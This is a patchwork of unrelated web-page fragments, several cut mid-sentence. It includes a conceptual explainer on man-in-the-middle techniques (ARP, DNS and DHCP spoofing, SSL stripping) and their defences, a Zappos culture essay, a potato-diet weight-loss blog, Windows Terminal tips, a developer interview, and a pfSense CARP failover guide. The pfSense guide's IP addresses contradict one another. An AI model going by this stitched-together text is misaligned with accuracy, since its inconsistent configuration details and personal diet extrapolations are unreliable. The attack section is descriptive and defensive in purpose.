wants to communicate with.</p><p>And these ARP packets can be forged to connect with a device as a legitimate one which is referred to as ARP spoofing.</p><p>This allows the attacker to intercept, modify, and drop the incoming messages.</p><p>MITM by ARP spoofing is done by exploiting two security issues. The first security issue is that each ARP request or response is trusted. As every request and response is trusted, you can just tell any device that’s on your network that you’re the router and that allows further communication.</p><p>The second one is that the clients can accept responses even if they didn’t send a request. Ultimately, you can respond to them as you are the router and could connect with them without the device sending any request.</p><h3 id="domain-name-system-dns-spoofing">Domain Name System (DNS) Spoofing</h3><p>Domain Name System (DNS) spoofing is a technique that tricks a user to a bogus website rather than the real one the user intends to visit. The website will appear to be the real one and you may think you’re visiting a safe, trusted website when you’re actually interacting with a fraudster. The attacker’s goal is to divert traffic from the real site or capture user login credentials and other data.</p><p>DNS spoofing is done by replacing the IP addresses stored in the DNS server with the ones under the control of the attacker.So, whenever a user tries to access a particular website, they get directed to the malicious website placed by the attacker in the spoofed DNS server.</p><h3 id="email-hijacking">Email Hijacking</h3><p>Email hijacking happens when attackers compromise and gain access to a user’s email account and watch communications to and from the account.</p><p>When an opportunity arrives, for instance, if the user is exchanging funds or any other data with another party, the attacker takes advantage of the situation by attempting to intercept the funds and transfer it to their own accounts.</p><p>Attackers can also use the email to take over other online accounts tied to the email account.</p><h3 id="internet-control-message-protocol-icmp-redirection">Internet Control Message Protocol (ICMP) redirection</h3><p>ICMP is used by network devices, like routers, to communicate with the source of a data packet about transmission issues. For example, it might report to the host that a requested service is not available or that a host or router could not be reached.</p><p>In order to establish a successful MITM attack, the attacker looks for the network hosts that are down. When these hosts are pinged by other nodes in the network, the attacker will respond to them by sending a successful ping message.</p><p>And in this way, the attacker can forge ICMP-redirect packets in order to redirect traffic to himself which eventually results in gathering all data passing through it.</p><h3 id="dynamic-host-configuration-protocol-dhcp-spoofing">Dynamic Host Configuration Protocol (DHCP) spoofing</h3><p>DHCP dynamically assigns IP addresses. In DHCP spoofing, an attacker’s computer is issued as a DHCP server and sends forged DHCP acknowledgments to any connecting nodes.</p><p>The attacker can supply its own IP address for the default gateway address or DNS server in forged DHCP requests hence executing a man-in-the-middle attack.</p><h3 id="ssl-stripping">SSL stripping</h3><p>SSL/TLS is a secure cryptographic protocol used to communicate sensitive information. The protocol’s security is established by creating an encrypted connection between two parties.</p><p>When a user enters a domain name or when an unsecured HTTP request is sent, the server responds via HTTP and then redirects the user to HTTPS.</p><p>The user then sends a secure HTTPS request, and the secure session is initiated. In order to strip the SSL, the attacker intervenes in this redirection of HTTP to HTTPS and allocates himself between the server and client. While the victim and attacker will be in an unsecured connection, the attacker maintains an HTTPS connection with the server.</p><h2 id="how-to-prevent-man-in-the-middle-attacks">How to Prevent Man-in-the-Middle Attacks</h2><p>MITM attacks can be detected or prevented by two means: authentication and tamper detection.</p><h3 id="authentication">Authentication</h3><p>Authentication provides a degree of certainty that a given message has come from a valid source. A public key infrastructure, such as TLS, can harden Transmission Control Protocol (TCP) against MITM attacks.</p><p>Implementing multi-factor authentication, pre-shared key authentication or certificate-based authentication makes it difficult for attackers who intercept messages to decrypt them, or construct fake messages for communicating with others.</p><h3 id="tamper-detection">Tamper Detection</h3><p>Tamper detection checks whether a message has been altered or not and ensures that the data is safe from corruption. This checks the integrity of the message by comparing the equivalent hash of the message sent by one user to the other one which can also be encrypted.</p><h2 id="best-practices-to-stay-safe-from-man-in-the-middle-attacks">Best Practices to Stay Safe from Man-in-the-Middle Attacks</h2><p>It is rarely possible for those affected to recognize whether a man-in-the-middle attack has …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main><p>Personally, I didn't know Tony or his previous history until my Tweeter feed got filled with the sad news about his death. It took me some time to learn more about Tony and his impact on our world today. After doing my research, I came to a conclusion: most of the companies today are totally missing out on creating a strong team culture. So, here are some key things that I was able to extract from numerous interviews and talks with Mr. Hsieh.</p><h2>What is your bad culture experience?</h2><p>Before Zappos, Tony was running a startup called LinkExchange. It was sold to Microsoft. Tony's reason for the exit was bad team culture. Tony admitted to this, and used it as a motivation to create a great team culture at Zappos. You can think about your own bad employee experience. What sucked for you at your first job? Perhaps you still have similar problems at your current company. Can you find a fix for them?</p><figure><p><img alt="notion image" src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff1d3c31c-1fcf-4309-b409-96d87ba41b57%2Fgift-habeshaw-Of8C-QHqagM-unsplash.jpg%3Ftable%3Dblock%26id%3Dc1b66b9d-f244-4e54-b77c-903224bb7d4d%26width%3D1000%26userId%3D%26cache%3Dv2?table=block&amp;id=c1b66b9d-f244-4e54-b77c-903224bb7d4d&amp;cache=v2"></p></figure><h2>Focus on your employees as much as on your customers.</h2><p>Don't forget that people who are on-board with your vision have their own dreams and aspirations. Try to think of ways you can make their job more enjoyable. For example, Zappos employees claim that they make decisions on their own. How great does that sound?</p><h2>Give Freedom to your employees.</h2><p>No micromanager will admit they micromanage. Maybe you should always assume that there's some micromanagement involved. So how will you create the type of environment where your team doesn't get told what to do yet still  achieves needed results? At Zappos, Tony was able to create this atmosphere. The customer support team doesn't have scripts. Their whole aim is to help people. They act based on principles and not direct tasks.</p><h2>Your focus should be your customer not your product.</h2><p>While Zappos started as an online shoe store, Tony said that they want to be much bigger than that. At the core of his company he preached to focus on customer and satisfy their needs instead of improving the product. At Zappos, the whole strategy was to ignore advertising as their growth channel and instead think about how customer service can be improved. This approach led to great sales results and mutual understanding inside of Zappos on what matters.</p><h2>Think creatively about your hiring.</h2><p>Zappos hires based on 2 fits. Fit for the hiring position and fit for the culture. After an interviewee is determined to be a great fit, Zappos offers them something very intriguing. A new hire has a chance to get paid for the training, plus a $3000 bonus if they reject the hiring offer. That way the people who accept the job feel more committed. Only about 2-3 percent of people take that offer. It's a great bargain for the company to onboard people who are there for the right reason and not just a paycheck. </p><h2>Don't start a brand, start a philosophy.</h2><p>The Zappos team created a set of 3 things that are essential for the brand: <b>Clothing, Customer Service, Culture. </b>By putting it all together, they have realized that Zappos is about <b>delivering happiness</b>. That's a genius way to distill your mission.</p><blockquote>“People may not remember exactly what you did, or what you said, but they will always remember how you made them <b>feel</b>”</blockquote><figure><p><img alt="notion image" src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0f41dc6c-adcd-40ca-ab18-1b4ce5cad667%2Flex-sirikiat-YlHhljkuEFE-unsplash.jpg%3Ftable%3Dblock%26id%3D5739c1c5-491c-474e-8773-e6048a565e56%26width%3D1000%26userId%3D%26cache%3Dv2?table=block&amp;id=5739c1c5-491c-474e-8773-e6048a565e56&amp;cache=v2"></p></figure><h2>Hire, promote, and fire based on culture values not on performance.</h2><p>It's up to you to decide what your company values are, but you should have them set. For Zappos, one of them is being humble. Turns out it's not easy to ask people about this value while hiring. The response won't be very accurate. To fix this issue, Zappos came up with a pretty smart way to uncover the truth. Since a lot of job applicants are out of town, Zappos hires a driver that picks them up from the airport. After the interview done, a driver is asked how the job applicant was treating them. If the driver says "bad", it doesn't even matter how good the interview was.</p><h2>Core values don't matter, committing to them does.</h2><p>Tony said that he took this idea from nature by looking at flying birds. As they fly they look like one organism. Birds do have very simple rules while traveling. Have some distance from the bird to the left, have some distance from the bird to the right. They are not guided by one main bird that tells them what to do. Those simple rules are just like your company culture principles. Commit to them and your team will be united. That's how Zappos was able to scale their team culture.</p><figure><p><img alt="notion image" src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe8254a5a-318a-475d-98ed-82ba113c641d%2Fvincent-van-zalinge-fiQ7YrVFPqs-unsplash.jpg%3Ftable%3Dblock%26id%3De99a523c-7963-4a1e-bc7e-3e520e7c7746%26width%3D1000%26userId%3D%26cache%3Dv2?table=block&amp;id=e99a523c-7963-4a1e-bc7e-3e520e7c7746&amp;cache=v2"></p></figure><h2>Chase the vision not the money.</h2><p>Even though it might sound obvious, Tony is very convinced about this idea. He was often being asked about what industry to enter to make a giant pile of money. This response was standard. Focus on problems and customers that you like the most. Money will follow. After selling his first startup, he was able to invest in dozens of startups. It was his choice to join Zappos. Without his love for the customer service, he wouldn't achieve such result. </p><blockquote>“Don't chase the paper- chase the dream” — P. Diddy</blockquote><h2>Rediscover your Happiness.</h2><p>Even though Tony left the world on a sad note, he was standing firm on the idea that we should focus on happiness. By happiness he didn't mean running after every pleasure but rather fulfilling purpose. I guess we should take a lesson from that and apply it to what we do. </p></main></div></div><div id="article-bottom"><hr><div><p><h2>Looking for new ways to stay connected with your team?</h2></p><p>Bill is a Slack app that helps your team get to know each other better using fun icebreaker games.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">
      <p> <em>Published: </em> 12/06/2020</p>

      <p>Today is day 9; I’m about to close it, it’s been a interesting week. My goal wasn’t to blog everyday and I’m glad I didn’t otherwise I’d have failed miserably. My fat is disappearing at a speed I never could have imagined. It’s totally transforming my life. Today is a recap of how things are going.</p>



<p>I’m kicking ass at the weightloss, but sometimes its a good idea to focus on some non scale victories; that’s where I’m going to start.</p>

<p>The biggest non sacle victory was on Saturday night. I went to bed on Friday having only ate some potatoes at dinner. It was about 6 pm when I last ate. I wokeup the next day, took my son on a morning drive to Panera to get coffee while the wife slept in. She slept and I drank a bunch of ice water &amp; coffee. Suddenly it’s 9:30 AM and we’re home then the baby gets fed. By noon I’m getting hungry. I decide not to eat until after my 1 pm pilates class. Well, I get home about 2:15 PM and I’m hungry but it’s only 4 hours until dinner. Here’s the kicker though, we’re having dinner at my in laws and they’re making fresh spaghetti with homemade noodles and meatballs; yummers?!??! I wait until dinner to eat, but I planned ahead. I brought a half dozen potatoes, yukon gold potatoes, with some rosemary and smoked paprika. I tossed in some oil (A cray ray No No) and the potatoes where MEH; dry and not super good. After a few but supportive questions my in laws didn’t care and didn’t ask me more about the diet. I was free to eat a plate of potatoes for dinner.</p>

<p>I didn’t even plan a 24 hour fast, it just happened. It led to scale victories.</p>



<p>So happy, no moodiness, no crankiness. Life is good. On hacker news people asked about poop and yes, that still happenes but to a much smaller quantity. At a baseline until 10:30-12:00, unless I wake up before 7am, I’m not really that hungry. I hang on as long as I can before eating. It gives me control and I love being in control.</p>



<p>It’s Stat time. Today, December 7, I’m down 23 pounds. From 337 down to 314. My starting line is when I got my Withings scale, it was Nov 20, 2020. 16 days and 23 pounds; an average of 1.43 pounds lost per day! I weight 327 when I started the potato diet, thus on the diet I’ve lost about 15 pounds. But down overall 23 pounds towards my 100 pound goal. This is remarkable and is motivating me to keep going. If this trend continues, I have 52 days left of eating this way; by Thursday, January 28, 2021, I could weigh about 230 pounds! The END of January!!!! That’s insane! That probably won’t happen, but who knows.</p>



<p>Plant based diet all the way. I’m planning our Christmas dinner to be plant based with ham for the wife and kiddo. Recently my wife and I compiled all of our favorite recipes and we came up with 12-15 common meals we rotate among 20 favorites. This is seasionally approprate and things we tend to love to eat. The cool thing about recoginizing the common pattern is I’m now compiling a list of recipes, plant based / vegan, recipes to try. The intent here is to have 10-15 easy to make recipes that I can serve myself while serving my family what they want. I have to become fanatical about this. Plant based is the way, it’s going to be more like religion and ideology and less like going on Paleo. I’m all in baby.</p>

<p>Once I have a dozen of dinner and lunch recipes that I like, I can rotate through them so I can enjoy my diet more while staying healthy.</p>

It’s packed with useful features like <abbr>GPU</abbr> acceleration, tabs, panes, themes, and shortcuts, along with full support for different environments such as PowerShell, Command Prompt, and <abbr>WSL</abbr>. In this article, I’ll describe a few ways to tailor the terminal experience to your needs along with tips and tricks to make development much easier.</section></div><div><article><p>The <a href="https://www.microsoft.com/en-ng/p/windows-terminal/9n0dx20hk701?rtc=1">Windows
terminal</a>
app is available on the Microsoft Store. If you open the store and search for
“Windows terminal”, it should be the first item on the list. It’s also available
on its <a href="https://github.com/microsoft/terminal/releases">GitHub releases page</a>
but you miss out on automatic updates. You can also install the <a href="https://www.microsoft.com/en-ng/p/windows-terminal-preview/9n8g5rfz9xk3?rtc=1&amp;activetab=pivot:overviewtab">Preview
version</a>
if you want to be on the bleeding edge of features.</p><figure><img width="1000" height="614" src="https://ik.imagekit.io/freshman/windows-terminal-1_Plzau63iDjBr.png" alt="Microsoft store showing Windows Terminal"></figure><p>Once installed, launch the terminal. The interface is quite straightforward with
tabs at the top and a dropdown menu for switching between the different
profiles.</p><figure><img width="1000" height="543" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-2_C-8vd45l6De8.png" alt="Windows terminal default view"></figure><p>You can open the Settings through the dropdown menu or by pressing <kbd>Ctrl +
,</kbd> on your keyboard. The terminal settings is managed through a
<abbr>JSON</abbr> file which will open in your default app for <abbr>JSON</abbr>
files.</p><figure><img width="1000" height="622" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-3_Xy74THOC14wLv.png" alt="Visual Studio Code showing the default settings for the Windows terminal"></figure><h2 id="launch-the-terminal-with-a-keyboard-shortcut">Launch the terminal with a keyboard shortcut</h2><p>The easiest way to bind the Windows terminal to a keyboard shortcut is to pin it
to the task bar and press the <kbd>Win</kbd> key plus the number corresponding
to the position of the program on the taskbar. For example, <kbd>Win + 3</kbd>
launches or focuses the terminal window on my computer.</p><figure><img width="977" height="240" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-6_Yav5vjNpV.png" alt="Windows taskbar showing position of Windows terminal"></figure><p>If you have <a href="https://www.autohotkey.com/">AutoHotkey</a> installed, you can run or
raise a Windows terminal instance with the help of <a href="https://gist.github.com/atruskie/99a498ac43b91deb91eab4069b6047b9">this
script</a>. All
you need to do is:</p><ul><li>Create a new text file with a <code>.ahk</code> extension.</li><li>Copy and paste the above script into the file.</li><li>Double click the file to run it.</li></ul><p>Once that’s done, you’ll be able to bring up the Windows terminal with a
keystroke. The linked script uses <kbd>Win + `</kbd>, but you can change it to
your preferred key binding. Instead of running the script manually everytime,
you can follow these
<a href="https://www.autohotkey.com/docs/FAQ.htm#Startup">instructions</a> to make it run
automatically on system startup.</p><h2 id="launch-the-terminal-from-windows-explorer">Launch the terminal from Windows Explorer</h2><p>You can launch the Windows terminal from the File Explorer by typing <code>wt</code> and
<kbd>Enter</kbd> in the address bar. This will launch a new terminal window in
your default user directory. To specify the current directory instead, use <code>wt -d .</code>.</p><figure><img width="1000" height="527" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-11_-lLtY9E28.png" alt="File explorer showing Windows Terminal command"></figure><p>Additionally, you can right click on a directory in File Explorer and select
“Open in Windows Terminal”. This will launch Windows Terminal with your default
profile in the selected directory.</p><figure><img width="1000" height="731" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-24_zKfCLgSUma4I.png" alt="File explorer showing Launch in Windows Terminal option"></figure><h2 id="change-the-default-profile">Change the default profile</h2><p>The default profile is what appears when you open the Windows terminal or a new
tab. By default, it’s a profile for Windows Powershell. If you prefer to work in
a Linux distribution, it may be more convenient to change the default profile to
your preferred <abbr>WSL</abbr> profile. To do so, update the value of the
<code>defaultProfile</code> property in the <code>settings.json</code> file with the <code>guid</code> of your
preferred profile.</p><figure><figcaption>settings.json</figcaption><div><pre><code data-lang="json"><span>{</span>

pressing <kbd>ctrl + tab</kbd> or <kbd>ctrl + shift + tab</kbd> will switch tabs in a
similar manner to web browsers. If you want to control the order of the tabs in
the tab switcher, you can set <code>tabSwitcherMode</code> to <code>mru</code> or <code>inOrder</code> which will

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="Post__Main-Content">
        <div>
          <p><strong>Hey Kaio! Thanks for taking the time to talk with me about your journey! To start, why don’t you tell me about yourself!</strong></p><p>I’m originally from <a href="https://www.google.com/maps/place/Goi%C3%A2nia+-+State+of+Goi%C3%A1s,+Brazil/@-11.7982607,-55.4825581,4.56z/data=!4m5!3m4!1s0x935ef0ede1248cf7:0xbaedffbfd0c11fd1!8m2!3d-16.6868982!4d-49.2648114">Goiânia, Goiás, Brazil</a> but currently live in a small city called <a href="https://www.google.com/maps/place/Palmas,+State+of+Tocantins,+Brazil/@-11.6859599,-50.3391487,6.56z/data=!4m5!3m4!1s0x933b3439911f1257:0x93b8070d05c818f!8m2!3d-10.249091!4d-48.3242858">Palmas</a>. Well it’s small by Brazil standards, it’s no São Paulo (12 million people) - there are about 400,000 people here. When I first arrived I only had my bike with me, I really like biking so I thought it would be all I’d need, but everything is pretty spread out so I now have a motorcycle as well.</p><p>For fun, I’m always reading plus... <em>something else</em>; for a while this was dancing. I learned 4-5 kinds of ballroom dancing, tango, zouki, forró and, of course, Brazil’s popular <a href="https://www.youtube.com/watch?v=CimlZ1Vaqzc">samba!</a> At some point I realized that I wanted to fight more than I wanted to dance so I started training in jiu jitsu!</p><p><strong>Hah! A bit of a change!</strong></p><p>Yes, I’ve been doing it for 3 years. After practicing on a daily basis, I can tell you the best defense is to run! Always try to run first in a bad situation, you never know the other person’s intentions, if they have a weapon, or what their training is.</p><figure><img src="https://res-3.cloudinary.com/hepw4b4yn/image/upload/q_auto/v1/ghost-blog-images/hobbies-kaio.jpg"></figure><p><strong>Great advice! So that’s your “something else” right now, but what do you like to read?</strong></p><p>I read a lot of different things. I’ve always read fantasy, but lately it’s been more “reality-related” stuff - a lot about leadership (like, <em>a lot</em>) or books that have communication as the main topic. <a href="https://www.amazon.com/Extreme-Ownership-U-S-Navy-SEALs/dp/1250067057">“Extreme Ownership”</a> by Jocko Willink and Leif Brabin is one of my favorites. Jocko has a podcast that I listen to as well and he talks about a book in almost every episode.</p><p>I’ve also been reading a lot of war-related books. They’re very interesting even though they get in the way of my sleep. It’s quite hard to sleep after you read about the ugly stuff of war! Though it doesn’t affect my dreams. The only fighting that happens in my dreams is jiu jitsu - I <em>always</em> wake up right after I get a hold locked on my opponent. Always!</p><p><strong>So you’re the CTO. How do you describe what you do here at Codelitt?</strong></p><p>The shortest description is: my job is to make sure that everyone on the engineering team has what they need to succeed in their tasks. Since I'm no longer a full-time engineer (although I work with engineering as much as I can) my goal is to make sure my team has all the resources they need. </p><p>So yes, I’m the CTO, but in the tech world my role goes by a lot of different names. It’s kind of a hybrid of management and engineering. At the end of the day a person in my position is leading, but I also have to be in the trenches to ensure that the quality of the output is something that I myself would be proud of.</p><p><strong>How did you end up in software engineering?</strong></p><p>I’ve always loved technology. I got my first computer when I was 11 years old. I like to say that I “never really left the chair” even though I grew up with my mom telling me that I’d lose the use of my hands if I worked on the computer all day. </p><p>For university, I was initially focusing on Biological Sciences but 2 years in when I was 19 years old I made the switch to software engineering. I used to think these two were <em>totally</em> different, but I realized that a lot of areas, ecology and DNA work for example, are very mathematical in their approach. Also I saw that there were some lessons in biology, like the importance of naming and classification, that are also key in software engineering. We try and fail miserably in engineering, but we’re getting there! </p><p><strong>What made you switch?</strong></p><p>I became frustrated that I had to go through an entire course to properly work in the biology market. I could do some internships, but they were pretty limited. I also looked into the future and didn’t like the idea of doing research for the university. I believed that the idea was to write <em>papers </em>instead of getting <em>results.</em> There seemed to be too much focus on getting points academically than producing quality output, you know, to be promoted at the university it is about research points, not research results.</p><p>Software engineering also gave me the freedom to work <em>where</em> I wanted to. I didn’t have to be in a lab to work. I could use my <em>reasoning </em>to solve problems and get results - I didn’t need something physical, a specimen, to solve a problem. When we studied substances and their effects on rats, we had to go to the lab. I realized I’d rather get the problem that I was supposed to solve and then go off somewhere to think about it.</p><p>I’m also a big fan of small victories. You know, the really small things that add up at the end of the day. You can have this in biology, but every advancement is pretty huge since we know so much at this point. With software engineering, you can literally create anything out of thin air. Goals are only limited by <em>time</em> and not by any <em>physical</em> resource. </p><figure><img src="https://res-5.cloudinary.com/hepw4b4yn/image/upload/q_auto/v1/ghost-blog-images/hobbies-kaio-1.jpg"></figure><p><strong>I like that! So how did you find Codelitt? </strong></p><p>So before I started with Codelitt I was working for a tech company in Goiânia. At this point, I had already been studying software engineering for a while. I made up my mind to find the top engineer within my company so I could find out what makes them the best at what they do. This person was Bruno! He would later go on to become the CTO.</p><p>A year or so after I met him, Bruno and I had teamed up to lead an effort to create a new product for the company and started discussing the idea of working remotely. One thing I noticed was that there were a lot of positions looking for Ruby engineers, so I teamed up with him to learn it - although he knew quite a lot of it already. We both decided to start looking for remote jobs with US based companies. It was actually Bruno that found Codelitt first!</p><p>So before Bruno started working as Codelitt’s CTO, I reached out to him to see if there were any open source projects that I could work on after I’d finished with my day job. For me it was all about practice and the chance to get some more experience. Luckily Bruno said, yes there was a project!</p><p>This project was actually the side project for Cody, Codelitt’s Founder, so I had the opportunity to meet him briefly. A few weeks later, Bruno sent me a screenshot of a Slack conversation where Cody was asking Bruno if he “knew this guy Kaio” because they needed a Ruby developer. I was so happy.</p><p>I was initially offered a contract job for 3 weeks. Cody made sure this assignment was super clear for me saying something like, “Hey this is the deal - we only have work for 3 weeks. I just want to make sure you understand that if you leave your job for this, then in 3 weeks you won’t have a job anymore.” </p><p>This was the first opportunity to work remotely <em>and</em> for the US. It was huge for me! I was <em>terrible </em>at English, though. Like seriously, at one point during the interview Cody said, “Hey Bruno you can continue the interview in portuguese and just let me know what you think.” Honestly though, as soon as I received the screenshot from Bruno I knew I was going to say yes!</p><p>With Bruno being the CTO of Codelitt, I had a lot of responsibilities that I wouldn’t normally have had as a junior developer. He was working side by side with the CEO. Career-wise, it was great for me. </p><p><a href="https://www.youtube.com/watch?v=jwG_qR6XmDQ">Jeff Bezos calls it “regret minimizing”</a>. The idea comes from the question “What will you regret - doing something or <em>not</em> doing something?” If I hadn’t taken the opportunity I know, then I would have regretted it.</p><p><strong>What are some of the big differences between then and now?</strong></p><p>First thing that comes to mind is the size. I first joined as a contractor and at that time this meant I only had contact with the people that I <em>needed </em>to have contact with: the CTO and COO. We were a total of 7 people then and today we’re 35-40 people typically. Back then the engineering team was only 3 people and more often than not we were working on the same project together.</p><p>The amount of projects that we manage at the same time is different too. In the early days it was no more than 2-3. It took a while to run 4 projects. Now we’re much more efficient.</p><p>The third biggest difference is communication. In the beginning, communication was easy with so few people and projects. It was almost too easy! Back then, I had direct access to the CTO. You know, I didn’t have to run a question to HR. Anything project-related I ran to the CEO! &nbsp;Now it’s very different.</p><p><strong>What are some of your favorite memories or favorite projects that you’ve worked on? </strong></p><p>I think about this a lot - I have a lot of good memories. With projects, we always have something new which is always fun. In the beginning, it would often be only myself and another developer on a project, most of the projects in my first two years were like this.</p><p>I’d say my favorite project was my first project. </p><p><strong>Why?</strong></p><p>It was the hardest thing I’ve ever done. I don’t think I’ve ever worked so hard in my life. I mean, I’ve probably worked harder on other projects in recent years but I’m stronger than I was then. It’s like a guy going to the gym the first time and trying to lift. It was the first project that I owned fully - pages, process, etc. - I was the one developer tasked with building <em>everything </em>the user will see. Working together with the CTO was huge because he was able to provide me with a ton of technical help. I wasn’t as good as someone should be for this project, so I had to work <em>extra </em>hard for it.</p><p>On a common day, I worked 14 hours. Between Aug 1st and Oct 11th I worked 7 days a week, 14 hours a day. I may have taken two Sundays off, but I still worked 6 hours. That was a “day off” for me. </p><p>I mention that not because I think it was good. It was NOT healthy. Nowadays I would <em>never </em>accept working like that again. It was a “high cost” experience because it’s not just about the time spent working, it’s also about mental health. At one point I remember getting to my desk and seeing 5 empty cans of Red Bull. Sometimes I’d go to bed at 12am and wake up at 4am. </p><p>It was a great experience because it showed me how far I could go.</p><p>Although I’d love to say that I was up for continuing on like this if needed, I wasn’t. On Monday Oct. 11th I had it in my mind that I didn’t have the ability to continue working …</p></div></section></div>

<ul><li><strong>CARP</strong> : a protocol for configuring a virtual IP which is used by pfSense. This virtual IP is taken over by the secondary server if the primary server encounters a problem.</li><li><strong>pfsync</strong> : a protocol used to synchronize the status of current connections between two pfSense servers (and more globally between two servers running <em>Packet Filter</em>).</li><li><strong>XML-RPC</strong> : a protocol for replicating data from one server to another. It is used in pfSense to replicate the configuration from the primary server to the secondary server.</li></ul>



<h2>1. Configuring virtual IPs</h2>



<p>In order to function, each pfSense server must have an unique IP address on its interface, as well as a virtual IP address which will be shared between the two pfSense servers.</p>



<p><strong>Therefore, pfSense needs 3 IP addresses per network.</strong></p>



<p>On the primary server, navigate to Firewall &gt; Virtual IPs :</p>

<p>Click on the “<strong><span>+ Add</span></strong>” button.<br>The fields to be filled in are the following:</p>



<ul><li><strong>Type</strong>: CARP</li><li><strong>Interface</strong>: WAN</li><li><strong>Address(es)</strong>: the virtual IP with the mask of this interface. In our case: 192.168.1.100/24</li><li><strong>Virtual IP Password</strong>: a password…</li><li><strong>VHID Group</strong>: let pfSense choose it. It should be unique per virtual IP</li><li><strong>Advertising frequency</strong>: let pfSense choose it. The “base” field is the advertising frequency in second. The “skew” field is the <em>phase shift</em>. 0 means usually primary server.</li></ul>

<p>We perform the same configuration on the LAN interface.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-carp-on-lan-interface-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-carp-on-lan-interface-pfsense-provya.png 720w, https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-carp-on-lan-interface-pfsense-provya-300x239.png 300w" sizes="(max-width: 720px) 100vw, 720px"><figcaption>[pfSense] Configuring CARP on LAN interface</figcaption></figure></div>



<p>Once done click on the “Apply Changes” button.</p>



<p>We can check the status of our virtual IP addresses from the menu Status&gt; CARP (failover):</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/09/menu-VIP-status-CARP-pfsense-provya.png" alt=""><figcaption>[pfSense] Status &gt; CARP (failover)</figcaption></figure></div>



<p>Both WAN and LAN virtual IP addresses are “<strong>Master</strong>“:</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/09/failover-status-vip-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/09/failover-status-vip-pfsense-provya.png 578w, https://www.provya.com/blog/wp-content/uploads/2020/09/failover-status-vip-pfsense-provya-300x73.png 300w" sizes="(max-width: 578px) 100vw, 578px"><figcaption>[pfSense] CARP Status</figcaption></figure></div>



<p><strong>All these configurations about virtual IPs must be performed on the primary pfsense (pfSense A) only</strong>.</p>



<h2>2. Forcing the use of virtual IP addresses</h2>



<p>The virtual IPs are configured but not used.</p>



<p>To do this, we need to configure pfSense to use the WAN VIP address for outbound traffic, the LAN VIP address for inbound traffic, and configure the different services to work with the LAN VIP address as the default address (for OpenVPN or DHCP configuration, for example).</p>



<p><strong>All these configurations must be performed on the primary pfsense (pfSense A) only</strong>.</p>



<h3><span>Configuring Outbound NAT</span></h3>



<p>Got to Firewall &gt; NAT, Outbound tab.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-nat-outbound-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-nat-outbound-pfsense-provya.png 489w, https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-nat-outbound-pfsense-provya-300x148.png 300w" sizes="(max-width: 489px) 100vw, 489px"><figcaption>[pfSense] Firewall &gt; NAT, Outbound tab</figcaption></figure></div>



<p>Check the button called “Hybrid Outbound NAT rule generation. (Automatic Outbound NAT + rules below)”. Then click on <strong>Add</strong> button.</p>



<p>The fields to be filled in are the following:</p>



<ul><li><strong>Interface</strong>: WAN</li><li><strong>Address Family</strong>: IPv4</li><li><strong>Protocol</strong>: any</li><li><strong>Source</strong>: Network – 192.168.1.0/24 (<em>i.e.</em> the LAN subnet)</li><li><strong>Destination</strong>: Any</li><li><strong>Address (Translation)</strong>: 192.168.1.100 (<em>i.e.</em> the VIP address on the WAN interface)</li></ul>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-nat-outbound-for-vip-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-nat-outbound-for-vip-pfsense-provya.png 800w, https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-nat-outbound-for-vip-pfsense-provya-300x193.png 300w, https://www.provya.com/blog/wp-content/uploads/2020/09/configuring-nat-outbound-for-vip-pfsense-provya-768x493.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>[pfSense] NAT Outbound rule</figcaption></figure></div>



<p>Once done we click on the “Apply Changes” button.</p>



<h3><span>Configuring DHCP Server</span></h3>



<p>If pfSense is the DHCP server on the network, we are going the change its configuration. We go to Services &gt; DHCP Server.</p>



<p>We modify the “Gateway” field to indicate the VIP address (192.168.99.100).</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-dhcp-server-configuration-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-dhcp-server-configuration-pfsense-provya.png 508w, https://www.provya.com/blog/wp-content/uploads/2020/10/carp-dhcp-server-configuration-pfsense-provya-300x66.png 300w" sizes="(max-width: 508px) 100vw, 508px"><figcaption>[pfSense] Gateway field on DHCP server configuration page</figcaption></figure></div>

<h3><span>Configuring OpenVPN Server</span></h3>



<p>If an OpenVPN server is configured on the pfSense, we modify the service listening interface (normally “WAN”) to replace it with the VIP address (192.168.1.100).<br>This modification is done in VPN &gt; OpenVPN, Servers tab.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-openvpn-server-configuration-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-openvpn-server-configuration-pfsense-provya.png 397w, https://www.provya.com/blog/wp-content/uploads/2020/10/carp-openvpn-server-configuration-pfsense-provya-300x153.png 300w" sizes="(max-width: 397px) 100vw, 397px"><figcaption>[pfSense] Listening interface on OpenVPN server configuration page</figcaption></figure></div>

<h3><span>Configuring VPN IPsec Service</span></h3>



